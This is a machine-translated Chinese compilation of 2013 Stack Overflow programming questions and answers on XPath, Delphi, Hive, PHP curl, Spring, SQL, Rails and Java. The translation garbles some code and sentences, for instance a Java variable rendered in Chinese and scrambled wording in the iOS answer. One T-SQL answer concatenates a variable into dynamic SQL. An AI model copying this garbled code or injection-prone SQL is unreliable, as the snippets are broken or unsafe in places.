我不知道你是否还有这个问题，但如果有人像我一样找到这个线程，这就是我找到的解决方案。我遇到了完全相反的问题，我需要去掉“ds:”前缀，所以我使用了 DOMSignContext 类中的 setDefaultNamespacePrefix() 方法。这是代码：

> DOMSignContext dsc = new DOMSignContext(privateKey, document.getDocumentElement().getElementsByTagName("Rps").item(indexNFEs));
> 
> dsc.setDefaultNamespacePrefix(""); // 这才是真正重要的
> 
> 签名.sign(dsc);

因此，要插入“ds:”，您可以尝试使用 setDefaultNamespacePrefix("ds:")

希望这对您或其他可能访问此页面的人有所帮助！

# delphi - 在运行时更改 Delphi 样式不允许将文件拖放到表单中

> ID：15110144
> 
> 赞同：8
> 
> 时间：2013-02-27T10:48:16.077
> 
> 标签：delphi, vcl-styles

我有以下允许从 Windows 删除文件的过程，删除工作正常，但是当我在运行时使用 ( `TStyleManager.TrySetStyle(styleName)`) 更改样式时，表单不再接受删除！这里到底有什么问题？

```
public //public section of the form
...
procedure AcceptFiles( var msg : TMessage ); message WM_DROPFILES;

...

procedure TMainFrm.AcceptFiles(var msg: TMessage);
 var
   i,
   fCount     : integer;
   aFileName : array [0..255] of char;
begin
   // find out how many files the form is accepting
   fCount := DragQueryFile( msg.WParam, {uses ShellApi is required...}
                            $FFFFFFFF,
                            acFileName,
                            255 );

  for I := 0 to fCount - 1 do
  begin
    DragQueryFile(msg.WParam, i, aFileName, 255);
    if UpperCase(ExtractFileExt(aFileName)) = '.MSG' then //accept only .msg files
    begin
       if not itemExists(aFileName, ListBox1) then// function checks whether the file was already added to the listbox
       begin
        ListBox1.Items.Add(aFileName);

       end
    end;
  end;
  DragFinish( msg.WParam );
end; 
```

...

```
procedure TMainFrm.FormCreate(Sender: TObject);
begin
  DragAcceptFiles( Handle, True ); //Main form accepts the dropped files 
end; 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-02-27T11:00:43.857

`DragAcceptFiles(Handle, True);`*将表单当前*使用的窗口句柄报告为接受文件。对窗体的某些更改会导致窗口句柄被销毁并重新创建，更改样式就是其中之一。发生这种情况时，`FormCreate`不会再次调用。当重新创建窗口句柄时，您还需要将新句柄报告为接受文件。您可以简单地将代码移动`FormCreate`到`CreateWnd`：

```
type
  TForm1 = class(TForm)
  private
    { Private declarations }
  protected
    procedure CreateWnd; override;
  public
    { Public declarations }
  end;

implementation

procedure TForm1.CreateWnd;
begin
  inherited;
  DragAcceptFiles(Handle, True);
end; 
```

# xml - XPath 选择祖先列表中没有特定元素的所有元素

> ID：15110148
> 
> 赞同：5
> 
> 时间：2013-02-27T10:48:30.197
> 
> 标签：xml, xpath

```
<Root>
  <SomeElement>
    ...
    <Wanted>.....</Wanted>
    <UnWanted>
      <Wanted>.....</Wanted>
    </UnWanted>
    <Wanted>.....</Wanted>
    ...
  </SomeElement>
</Root> 
```

我想在任何级别选择“ `Wanted`”内部的“”元素，但不选择“ ”元素的子元素。`SomeElement``UnWanted`

使用 XPath `/Root/SomeElement//Wanted`，我无法排除`UnWanted`.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T10:58:29.273

你可以试试

```
/Root/SomeElement//Wanted[not(ancestor::UnWanted)] 
```

这将排除`Wanted`作为元素的子、孙等（在任何级别）的所有`UnWanted`元素。如果您只想排除*直接子*元素`Wanted`（但仍包括孙子元素等），则更改为*`UnWanted``ancestor::``parent::`*

 *```
/Root/SomeElement//Wanted[not(parent::UnWanted)] 
```*

# amazon-s3 - Hive 未正确创建 CSV 文件

> ID：15110149
> 
> 赞同：0
> 
> 时间：2013-02-27T10:48:32.880
> 
> 标签：amazon-s3, hive, amazon-emr

我正在尝试将 Hive 结果导出到位于 Amazon s3 上的文件。

但结果文件有一些无法识别的字符，如正方形等。

结果文件格式的类型是二进制/八位字节流而不是 csv。

我没有得到它无法创建 csv 文件的乳清。

使用的 hive 版本是 hive-0.8.1。

我把我遵循的步骤放在下面。

顺便说一下，hive 是从 Amazon EMR 启动的实例中使用的。

```
 create table test_csv(employee_id bigint, employee_name string, employee_designation string) row format delimited fields terminated by ',' lines terminated by '\n' stored as textfile;

  insert overwrite table test_csv select employee_id , employee_name , employee_designation from employee_details;

  INSERT OVERWRITE DIRECTORY 's3n://<path_to_s3_bucket>' SELECT * from test_csv; 
```

你能告诉我这可能是什么原因吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T20:54:12.930

您可以通过命令行从 Hive 导出数据：

`hive -e 'select * from foo;' > foo.tsv`

您可能可以通过 sed 或其他方法将制表符转换为逗号，我们只是使用 TSV 来处理所有内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:21:24.070

您是否尝试将 HDFS 中的 Hive 仓库目录打开到您的输出以检查数据是如何存储在那里的？

我认为这条线不需要执行

```
INSERT OVERWRITE DIRECTORY 's3n://<path_to_s3_bucket>' SELECT * from test_csv; 
```

相反，您可以直接执行**“dfs -get”**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T13:41:15.850

For I know, `INSERT OVERWRITE DIRECTORY` will always use ctrl-A('\001') as delimiter. Direct copy of file with your table data would be the best solution. GL.

# jquery - TypeError: $(...).tablesorter 不是函数

> ID：15110151
> 
> 赞同：0
> 
> 时间：2013-02-27T10:48:37.857
> 
> 标签：jquery

我正在使用 jquery.tmpl 通过 ajax 调用创建表。表行来自数据库。

我包括了所有的tablesorter插件，tablesorte，js，latest.js和css

但它给出了错误，因为 tablesorter 不是一个函数......

```
$.ajax({
.....
  success:function(){
    $("#mytable").addClass("tablesorter");
    $("#mytable:has(tbody tr)").tablesorter();
  }
}); 
```

# xpath - XPath/XQuery - 匹配包含特定值的所有元素

> ID：15110152
> 
> 赞同：2
> 
> 时间：2013-02-27T10:48:38.947
> 
> 标签：xpath, xquery

我的 XML 看起来有点像这样：

```
<root>
  <child1>
    <grandchild1>{tagID1}<grandchild1/>
    <grandchild2>{tag2}<grandchild2/>
  </child1>
  <child2>{newtag1}<child2/>
<root/> 
```

我希望检索其 text() 类似于“{*}”的所有元素，即包含两个花括号之间的字符串，但对 xpath 不太熟悉。

我认为 xquery 语法会是这样的

```
"//*[matches(., '{*}')]" 
```

但这因未知方法“-->matches(.<--”而失败

如果有人可以纠正我，我将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:07:17.160

该[`matches()`](http://www.w3.org/TR/xpath-functions/#func-matches)功能可用于 XPath 2.0，但您的 XPath 引擎可能只支持 XPath 1.0。

如果是这种情况，您将不得不得到这样的结果：

```
//*[./text()[starts-with(., '{') and substring(., string-length(.), 1)='}']] 
```

它寻找

```
ANY ELEMENT
//*
   THAT HAS A TEXT NODE
   [./text()                                                               ]
            WHICH STARTS WITH A '{'
            [starts-with(., '{')                                          ]
                                 AND ENDS WITH A '}'
                                 and substring(., string-length(.), 1)='}' 
```

如果 XPath 1.0 中有任何函数，函数调用会执行您对函数的`substring()`期望。`ends-with()`

* * *

**编辑**（以解决 OP 关于`starts-with()`未找到的评论）

我从未见过不知道`starts-with()`. 如果它至少可以识别该`substring()`功能，您可以尝试以下解决方法：

```
//*[./text()[substring(., 1, 1)='{' and substring(., string-length(.), 1)='}']] 
```

应该做同样的事情。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T11:11:06.710

您的 XPath 看起来是正确的，但 xml 和正则表达式是错误的。

{} 是特殊字符，必须用 \ 转义。而a * 不能单独使用。所以正确的表达式是（使用 text() 而不是 .，所以它不会检查所有后代的文本）：

```
//*[matches(text(), '\{.*\}')] 
```

尽管该函数仅在 XPath 2（和 XQuery，因为它是一个超集）中可用，但您可以尝试使用 full name `fn:matches`。

在 xml 中，右斜杠必须在另一侧：

```
<root>
  <child1>
    <grandchild1>{tagID1}</grandchild1>
    <grandchild2>{tag2}</grandchild2>
  </child1>
  <child2>{newtag1}</child2>
</root> 
```

# php - 在 php 中使用 curl 进行自动化作业

> ID：15110153
> 
> 赞同：1
> 
> 时间：2013-02-27T10:48:39.247
> 
> 标签：php, curl, jobs

我一直在寻找在外部网站上做自动化工作。有人告诉我我应该使用 curl，所以我想我在问 curl 是否是一个选项？我将如何使用这些输入字段来做到这一点：

```
name="fname"
name="lname"
name="bio"
name="website"
name="email"
name="password"
name="Cpassword"
name="token"
name="submit" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T10:50:52.817

是的，在 cron 作业示例中正确使用 curl 集告诉您。

```
//The data
$data = array(
    "fname" => "Mark",
    "lname" => "Jones",
    "Bio" => "Hi i like rose's because they smell nice",
    "website" => "http://mysite.com",
    "email" => "mark@mysite.com",
    "password" => "mypassword",
    "token" => "your token",
    "Agent" => "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5"
);

//External site direct link
$external_site = "http://external-site.com";

//Input field names with data ready
$input_fields = "fname=".$data['fname']."&lname=".$data['lname']."&Bio=".$data['bio']."&website=".$data['website']."&email=".$data['email']."&password=".$data['password']."&Cpassword=".$data['password']."&token=".$data['token']."&submit=";

//Do the curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL , $external_site);
curl_setopt($ch, CURLOPT_USERAGENT, $data['Agent']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $input_fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$done = curl_exec ($ch);
curl_close($ch); 
```

有关 curl 的更多信息，请访问[http://php.net/manual/en/book.curl.php](http://php.net/manual/en/book.curl.php)并且对于 cron 作业的大多数主机提供现成的 cron 功能以使用 XD。

# servlets - 路径规范和多个 servlet

> ID：15110155
> 
> 赞同：0
> 
> 时间：2013-02-27T10:48:45.850
> 
> 标签：servlets, spring-mvc, jetty

我想要两个 servlet（我正在使用 Jetty）提供这样的 URL：

```
host/aaa/submit  
host/bbb/submit 
```

我尝试将 servlet 的路径规范分别设置为`aaa`和`bbb`，但随后出现异常

```
two controller methods annotated with @RequestMapping(value = {"/submit"}) 
```

（尽管有问题的两种方法是在两个不同的 servlet 使用的两个单独的控制器类中定义的）。
相反，如果我将两个 servlet 的 pathspecs 设置为`/`并将其更改`@RequestMappings`为`aaa/submit`and `bbb/submit`，我将得到 404。（我想这并不令人惊讶——不确定它应该如何有效地与两个“默认”servlet 一起工作）

我应该如何映射这些 URL？（先发制人 - 它们**确实**需要是单独的 servlet -`aaa`部分应该使用或不使用 DB，`bbb`部分应该在没有 DB 的情况下失败）

以防万一，这里是 Jetty 上下文：

```
 <property name="servletHandler">
        <bean class="org.mortbay.jetty.servlet.ServletHandler">
            <property name="servlets">
                <list>
                    <bean name="aaaServlet" class="org.mortbay.jetty.servlet.ServletHolder">
                        <property name="name" value="aaa" />
                        <property name="servlet">
                            <bean class="org.springframework.web.servlet.DispatcherServlet" />
                        </property>
                        <property name="initParameters">
                            <map>
                                <entry key="contextConfigLocation" value="classpath:aaa-context.xml" />
                            </map>
                        </property>
                    </bean>
                    <bean name="bbbServlet" class="org.mortbay.jetty.servlet.ServletHolder">
                        <property name="name" value="bbb" />
                        <property name="servlet">
                            <bean class="org.springframework.web.servlet.DispatcherServlet" />
                        </property>
                        <property name="initParameters">
                            <map>
                                <entry key="contextConfigLocation" value="classpath:bbb-context.xml" />
                            </map>
                        </property>
                    </bean>
                </list>
            </property>
            <property name="servletMappings">
                <list>
                    <bean class="org.mortbay.jetty.servlet.ServletMapping">
                        <property name="servletName" value="aaa" />
                        <property name="pathSpec" value="/" />
                    </bean>
                    <bean class="org.mortbay.jetty.servlet.ServletMapping">
                        <property name="servletName" value="bbb" />
                        <property name="pathSpec" value="/" />
                    </bean>
                </list>
            </property>
        </bean>
    </property> 
```

两个控制器看起来像这样：

```
@Controller
public class AaaController {
  @RequestMapping(value = {"/aaa/submit"}, method = (RequestMethod.POST))
  public void handleAaaSubmitPostRequest(final HttpServletRequest request,
                                       final HttpServletResponse response,
                                       @RequestBody String body) throws IOException {
} 
```

和

```
@Controller
public class BbbController {
  @RequestMapping(value = {"/bbb/submit"}, method = (RequestMethod.POST))
  public void handleBbbSubmitPostRequest(final HttpServletRequest request,
                                       final HttpServletResponse response,
                                       @RequestBody String body) throws IOException {
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:54:07.277

由于您的控制器似乎在不同的 mvc 上下文中，因此您需要根据以下内容更改控制器：

```
@Controller
public class AaaController {
  @RequestMapping(value = {/*aaa*/"/submit"}, method = (RequestMethod.POST))
  public void handleAaaSubmitPostRequest(final HttpServletRequest request,
                                       final HttpServletResponse response,
                                       @RequestBody String body) throws IOException {
} 
```

和

```
 @Controller
public class BbbController {
  @RequestMapping(value = {/*bbb*/"/submit"}, method = (RequestMethod.POST))
  public void handleBbbSubmitPostRequest(final HttpServletRequest request,
                                       final HttpServletResponse response,
                                       @RequestBody String body) throws IOException {
} 
```

发生这种情况是因为 Spring MVC 总是使用没有 servlet 上下文的路径。

# sql - 加入一个 sql 视图和一个表

> ID：15110156
> 
> 赞同：1
> 
> 时间：2013-02-27T10:48:47.937
> 
> 标签：sql, sql-server, join

我创建了一个视图，而不是在一个存储过程中我想将它与一个表连接起来，但是我遇到了错误：

> 对过程“vw_Security”的请求失败，因为“vw_Security”是一个视图对象。

这是我的 sp ：

```
BEGIN

  -- declare the tables we will use
  DECLARE @Temp_Order TABLE
  (
    order_id  decimal,
    TRADE_PLACE_ID  decimal,
  )

  DECLARE @Temp_Pos TABLE
  (
    Fund_Type varchar(max),
    Desk_Ticker varchar(max),
  )

  DECLARE @Temp_Tick TABLE
  (
    SyCode varchar(max),
    Group_Name varchar(max)
  )

  INSERT INTO @Temp_Order
  EXEC LNK_xxxx @fromDate = '02/26/2013' ,
          @ToDate  = null, 
          @Trader = '' , 
          @Accts = @fundname    

  INSERT INTO @Temp_Pos
  EXEC LNK_Txxxxxx

  INSERT INTO @Temp_Pos
  EXEC LNK_xxxxx

  ;WITH CTE AS 
  ( 
    SELECT DISTINCT Ticker,CREATE_DATE,COMMENTS,EXEC,POS.Weighted_Avg_Price 
    from @Temp_Order TOR
    LEFT JOIN @Temp_Pos POS ON TOR.TICKER = POS.Desk_Ticker
  )
  SELECT Group_Name 
  From LNK_xxxxxx.dbo.vw_Security 
END 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T10:51:39.883

您没有在现有查询中加入您的视图。您需要使用`JOIN`语法将视图与`CTE`：

```
;WITH CTE AS 
( 
  SELECT DISTINCT Ticker,CREATE_DATE,COMMENTS,EXEC,POS.Weighted_Avg_Price 
  from @Temp_Order TOR
  LEFT JOIN @Temp_Pos POS 
    ON TOR.TICKER = POS.Desk_Ticker
)
SELECT s.Group_Name 
From LNK_xxxxxx.dbo.vw_Security s
JOIN CTE c
  on s.someCol = c.someCol  -- replace the someCol with your columns for joining 
```

# linux - 在运行 3.6 内核的 Fedora 上安装 Quartus Jungo WinDriver

> ID：15110164
> 
> 赞同：1
> 
> 时间：2013-02-27T10:49:16.577
> 
> 标签：linux, fedora, intel-fpga, quartus

我新安装了 Quartus WebEdition 12，我正在尝试安装设备驱动程序。

`/opt/altera`是安装 altera 的文件夹。

`/opt/altera/quartus/drivers/wdrvr/linux64`是从我试图按照教授的建议安装驱动程序的地方。

该`configure`命令执行良好。`make`不能说内核太新，使其不受支持。我在fedora 上使用3.6.11 内核。

对问题有帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T13:33:41.633

您收到的错误消息仅意味着您尝试加载的预构建内核模块是为与您正在运行的版本不兼容的 Linux 内核版本构建的。从这里你有几个选择：

1.  使用 Altera 正式支持的 Linux 发行版之一。有关详细信息，请参阅[操作系统支持](http://www.altera.com/download/os-support/oss-index.html)页面。
2.  从源代码构建 Jungo 驱动程序。此进程通常使用您当前正在运行的内核版本，因此应该完全兼容并停止抱怨。

您可能想选择第二个选项。以下是 Altera[所说的](http://www.altera.com/literature/ug/ug_cvp.pdf)：

> **在 Linux 系统中安装 Jungo WinDriver 模块**
> 
> 转到 /quartus/drivers/wdrvr/linux[32|64] 并运行以下命令：
> 
> ```
> $ ./configure--disable-usb-support b. make
> $ su
> $ make install 
> ```
> 
> 根据您希望允许用户通过模块访问硬件的方式，您可以更改设备文件 /dev/windrvr6 的权限（例如，chmod 666 /dev/windrvr6）。
> 
> 如果您在 64 位 Linux 系统上运行，请在运行 quartus_cvp 之前使用以下命令设置 QUARTUS_64BIT 环境变量：
> 
> ```
> export QUARTUS_64BIT=1 
> ```

在你这样做之前，通过运行以下命令确保你有内核源代码：

```
su -c 'yum install kernel-devel' 
```

希望能帮助到你。祝你好运！

# mysql - rails COUNT SELECT DISTINCT

> ID：15110166
> 
> 赞同：22
> 
> 时间：2013-02-27T10:49:36.000
> 
> 标签：mysql, ruby-on-rails, count, distinct

我正在记录用户观看一系列视频的次数。现在我正在尝试制作每天观看任何视频的用户数量的图表。

```
UserVideoWatching.where("created_at >= ? AND user_id != ?",1.month.ago, User.elephant.id).group("DATE(created_at)").reorder('created_at').count 
```

产生 sql

```
SELECT COUNT(*) AS count_all, DATE(created_at) AS date_created_at FROM `user_video_watchings` WHERE (created_at >= '2013-01-27 10:43:24' AND user_id != 7) GROUP BY DATE(created_at) ORDER BY created_at 
```

这会为每天观看的所有视频产生正确的结果，但正如我所说，我只想向每个用户显示一次。

我想要的sql是

```
SELECT COUNT(DISTINCT user_id) AS count_all, DATE(created_at) AS date_created FROM `user_video_watchings` WHERE (created_at >= '2013-01-27 10:33:18' AND user_id != 7) GROUP BY DATE(created_at) ORDER BY created_at 
```

所以我认为

```
UserVideoWatching.where("created_at >= ? AND user_id != ?",1.month.ago, User.elephant.id).group("DATE(created_at)").reorder('created_at').select('COUNT(DISTINCT user_id) AS count_all, DATE(created_at) AS date_created') 
```

会做我想做的事。但这给了

```
[#<UserVideoWatching >, #<UserVideoWatching >] 
```

而不是哈希。

有任何想法吗？

我正在使用 rails 3.1 和 mysql

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-02-27T11:17:37.297

您可以使用`distinct.count(:attribute_name)`.

（在 Rails 3 中使用：`count(:user_id, distinct: true)`代替）

因此：

```
UserVideoWatching.where("created_at >= ? AND user_id != ?", 1.month.ago, User.elephant.id)
.group("DATE(created_at)").reorder('created_at').distinct.count(:user_id) 
```

无法测试，但我认为这会产生您所追求的 SQL。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2015-10-12T20:00:04.770

在 Rails 4 中，使用`(...).uniq.count(:user_id)`其他答案中提到的（对于这个问题和 SO 的其他地方）实际上会导致查询中出现额外`DISTINCT`的内容：

`SELECT DISTINCT COUNT(DISTINCT user_id) FROM ...`

我们实际上要做的是自己使用一个 SQL 字符串：

`(...).count("DISTINCT user_id")`

这给了我们：

`SELECT COUNT(DISTINCT user_id) FROM ...`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-06-01T02:14:14.023

应该使用 distinct，在 rails 5.0.1 中，distinct equal uniq，但是

```
[11] pry(main)> Needremember.distinct.count(:word)
(1.1ms)  SELECT DISTINCT COUNT(DISTINCT "needremembers"."word") FROM "needremembers"
[12] pry(main)> Needremember.uniq.count(:word)
DEPRECATION WARNING: uniq is deprecated and will be removed from Rails 5.1 (use distinct instead) (called from __pry__ at (pry):12)
   (0.6ms)  SELECT DISTINCT COUNT(DISTINCT "needremembers"."word") FROM "needremembers" 
```

# php - 评分中的点赞数和点赞数

> ID：15110169
> 
> 赞同：0
> 
> 时间：2013-02-27T10:49:45.120
> 
> 标签：php, math

如何从投票数和评分中发现点赞数和点赞数。

例如我有`rating of +203`and `301 votes`。每票是-1或+1

我试过的

```
 $NEGATIVE_VOTES = ( $row['rating'] - $row['vote_num'] );
    $POSITIVE_VOTES = ( $row['vote_num'] - $NEGATIVE_VOTES ); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-27T10:56:39.020

```
| rating | votes | positive | negative |
| 300    | 300   | 300      | 0        |
| 299    | 301   | 300      | 1        |
| 298    | 302   | 300      | 2        |
                ... 
```

我希望你能看到模式。反对票数是评分与票数之差**除以 2**。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:00:17.583

所以我们有：

nb 投票 = 301 nb thumbup = x，nb thumbdown = y

我们有 x + y = 301 和 x - y = 203

所以 2y = 98 -> y = 49 -> x = 总计 - y = 301 - 49 = 252

--> Nb 拇指向上 = 252 和 nb 拇指向下 = 49

# google-tv - 谷歌电视内置皮肤丢失

> ID：15110170
> 
> 赞同：0
> 
> 时间：2013-02-27T10:49:48.667
> 
> 标签：google-tv

我前段时间使用 API Level12 Emulator 在 GoogleTV 上开发了一个应用程序。

刚刚由 ADT 更新到 ADT 21.0 现在如果我尝试创建新的 AVD ，我有以下选项

1.  设备
2.  目标
3.  中央处理器
4.  带有复选框的皮肤

我可以选择目标并选择设备，它适用于移动设备。

如果我选择 Target - GoogleTV Addon ，在设备部分我没有得到任何兼容的设备，我可以；选择 720p 或 1080p 的皮肤。（以前的选项是为 GoogleTV 选择皮肤）

请提供我，我如何以 GoogleTV 插件为目标定义 GoogleTv 设备。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T15:43:49.493

您需要先创建一个“设备定义”，然后将其用于新的“Android 虚拟设备”。设备定义需要配置正确的屏幕分辨率和硬件规格：DPad、横向、大屏幕尺寸和 xhdpi 密度。我建议同时配置 720p 和 1080p 设备来测试您的布局和位图资源。

这是一个包含以下步骤的链接：[http ://waynemay.com/installing-and-configuring-the-google-tv-emulator/](http://waynemay.com/installing-and-configuring-the-google-tv-emulator/)

# iphone - IOS中的GoogleAnalytics并扩展了两个以上的类？

> ID：15110176
> 
> 赞同：0
> 
> 时间：2013-02-27T10:50:05.097
> 
> 标签：iphone, ios, google-analytics, extend

我正在尝试将 GoogleAnalytics 实现到我的 IOS 应用程序并遇到以下问题：如果您想将 GA 中的跟踪器初始化为特定视图（我们称之为视图 X），您需要将类扩展`GAITrackedViewController.h`到视图 X。

就我而言，我已经在我的项目中扩展了另一个类，而且我们都知道你不能扩展 2 个类。所以我想知道，我如何在目标 C 中解决这个问题？请记住，我不是一个非常有经验的程序员，而且我也是 Objective C 的新手。

我将发布我`HomeViewController.h`的上面被称为 View X 示例的内容。如您所见，它已经扩展了`MLUIViewController`。如果我还想扩展`GAITrackedViewController`以启用 GoogleAnalytics，我该如何实现？/ 问候

```
#import <MessageUI/MessageUI.h>
#import <MessageUI/MFMailComposeViewController.h>

@interface HomeViewController : MLUIViewController <UITableViewDelegate,  UITableViewDataSource, UISearchBarDelegate, UIActionSheetDelegate, UIAlertViewDelegate, MFMailComposeViewControllerDelegate, UIGestureRecognizerDelegate, MLSearchTaskDelegate,  MLDeactivateDelegate>

{
IBOutlet UITableView *tableView;
IBOutlet UIBarButtonItem *menuButton;

IBOutlet UILabel *infoViewTitle;
IBOutlet UIView *infoView;

...................... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T10:56:51.720

只需`MLUIViewController`从. `GAITrackedViewController`_ `GAITrackedViewController`_`HomeViewController`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T10:57:13.813

您不能进行多重继承。

检查类似问题的答案：[iphone 开发：是否可以扩展多个视图控制器？](https://stackoverflow.com/questions/14216312/iphone-development-is-it-possible-to-extend-more-than-one-viewcontrollers/14216673#14216673)

# sql-server-2008 - 将@var 添加到 SQL Insert into ... values ( SELECT ...[here] FROM ... )

> ID：15110189
> 
> 赞同：-1
> 
> 时间：2013-02-27T10:50:40.893
> 
> 标签：sql-server-2008, tsql

假设我正在将一个表数据值复制到另一个表中。

`INSERT INTO T1(field_list) VALUES( SELECT field_list FROM T2 )`

而不是插入第二个表的一列，我提供了一个变量。这就像

`INSERT INTO T1(field_list) VALUES ( SELECT field_list, @variable FROM T2 )`

考虑到列数没有错误，我没有提供一些静态文本，而是提供了一个变量名。

如果我将@variable 更改为一些静态文本，它可以工作但@variable 无效。

在这种情况下如何提供@variable？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:34:15.953

```
INSERT INTO T1(field_list) 
SELECT field_list, @variable FROM T2 
```

除非您的表不允许 null 并且您要插入与 insert into 语句中定义的列相同数量的值，否则它应该可以正常工作。

正如你所说的变量被声明，它不应该是一个问题。

**编辑：**

@Variable 可以是从前端传递的动态文本，也可以是分配给 SP 中变量的静态文本。它应该适用于所有情况。

INSERT INTO T1(field1,field2) SELECT field2, @variable FROM T2

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:02:14.367

您必须首先声明@variable

```
DECLARE @variable varchar(255)
SET @variable = 'myColumn'
EXECUTE (' SELECT *, ' + @variable + ' FROM myTable' ) 
```

# jquery - jquery mobile中的滑动面板[data-role="panel"]

> ID：15110191
> 
> 赞同：0
> 
> 时间：2013-02-27T10:50:44.793
> 
> 标签：jquery, html, jquery-ui, css, jquery-mobile

我已经使用 jquery mobile 创建了滑动面板，我想减小面板的宽度大小，我不知道该怎么做？！我用谷歌搜索了很多，但没有找到正确
的代码：

```
<div data-role="page" id="home" class="jqm-demos ui-responsive-panel" data-title="Home">
    <div data-role="panel" id="myPanel" data-theme="a" data-dismissible="true" class="ui-responsive-panel">
        <div id="menu">
            <ul>
                <li class="active"><a href="#home" class="contentLink">Home </a></li>
                <li><a href="#home" class="contentLink">My profile </a></li>
                <li><a href="#home" class="contentLink">My Score </a></li>
                <li><a href="#home" class="contentLink">Ask Questions </a></li>
            </ul>
        </div>
    </div>
    <div data-role="header" data-position="fixed">
        <h1>Home</h1>
        <a href="#myPanel" data-role="button" data-display="reveal" data-position="right" data-icon="gear" data-reveal="reveal" data-dismissible="true">Menu</a>
    </div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T10:57:36.257

尝试使用 css：

```
.ui-responsive-panel{
   width: 200px; /* <---------your choice of px*/
} 
```

使用 jQuery：

```
$(function(){
   $('#myPanel').css('width','200px');
}); 
```

或这个：

```
 $('#myPanel').width(200); 
```

您的评论：*`i want decrease the width size of the panel`*尝试以下一个：

```
$(function(){
   $('#myPanel').css('width',$(this).width()-200+'px');
}); 
```

# winforms - 如何在条件下更改 datagridview 文本中的文本。

> ID：15110193
> 
> 赞同：3
> 
> 时间：2013-02-27T10:50:50.853
> 
> 标签：winforms, datagridview, c#-3.0

我正在使用datagridview，我想显示条件格式，这意味着当我获得一个单元格时`M`，我想显示`Married`。我尝试了这个但没有成功。

这是我的代码：

```
private void masterDataGridView_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)
      {
          try
          {
              for (int i = 0; i <= masterDataGridView.Rows.Count - 1; i++)
              {
                  String Value = masterDataGridView.Rows[i].Cells[17].Value.ToString();
                  if (Value == "M")
                  {
                      e.Value = "Male";
                  }
              }
          }
          catch (Exception ex)
          {

          }
      } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:29:54.343

经过一些工作，这段代码对我来说非常好。我发布它可能是任何其他可以使用代码

```
private void masterDataGridView_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)
{

    if (masterDataGridView.Columns[e.ColumnIndex].Name.Equals("Gender"))
                      {
                          string _val = e.Value as string;
                          if (_val == null)
                              return;

                          switch (_val)
                          {
                              case  "M" :
                                  e.Value = "Male";
                                  break;
                              case "F":
                                  e.Value = "Female";
                                  break;

                          }

                      }
} 
```

切丝……

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:13:33.633

您正在尝试使用不正确的[`.CellFormatting`](http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridview.cellformatting.aspx)事件。`for loop statement`

> 每次绘制每个单元格时都会发生 CellFormatting 事件，因此在处理此事件时应避免冗长的处理。当检索到单元格 FormattedValue 或调用其 GetFormattedValue 方法时，也会发生此事件。

所以每次绘制单元格时，`for loop`都会运行。

试试这个：

```
private void masterDataGridView_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)
{
    try
    {
        if (e.ColumnIndex >= 17 && e.ColumnIndex <= 24)
        {
            if (e.Value == "M")
                e.Value = "Married";
            else
                e.Value = "Not Married";
        }
    }
    catch (Exception ex)
    {

    }
} 
```

# java - 通过参考 Java。整数 ins 没有被修改，Collection 被修改，为什么？

> ID：15110200
> 
> 赞同：-6
> 
> 时间：2013-02-27T10:51:09.687
> 
> 标签：java, collections, integer, pass-by-reference

我有两个例子我不明白

Java将值作为变量传递或通过引用传递

为什么在`Ref`类中整数变量没有改变`(null)`？为什么在`RefCol`类中修改集合变量`col(1)`？

类参考：

```
test(): entero: 5

inicio(): entero: null 
```

类 RefCol：

```
test(): col: [1]

inicio(): col: [1] 
```

.

```
import java.util.Collection;
import java.util.Vector;

public class Ref {

    public static void main(String[] args){
        Ref ref = new Ref();
        ref.inicio();
    }

    public void inicio(){
        Integer entero = null;
        test(entero);
        System.out.println("inicio(): entero: " + entero);
    }

    public void test(Integer entero){
        entero = new Integer(5);
        System.out.println("test(): entero: " + entero);
    }

}

public class RefCol {

    public static void main(String[] args){
        RefCol ref = new RefCol();
        ref.inicio();
    }

    public void inicio(){
        Collection col = new Vector();
        test(col);
        System.out.println("inicio(): col: " + col);
    }

    public void test(Collection col){
        col.add( new Integer(1) );
        System.out.println("test(): col: " + col);
    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T10:54:18.913

您正在将 REFERENCE 的副本传递给对象实例。

如果直接更改对象。例如`col.add`，它将改变底层对象。

如果您更改它所引用的对象。例如`new Integer()`，它只会改变局部变量的引用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T10:54:22.127

不是一回事。

```
entero = new Integer(5); 
```

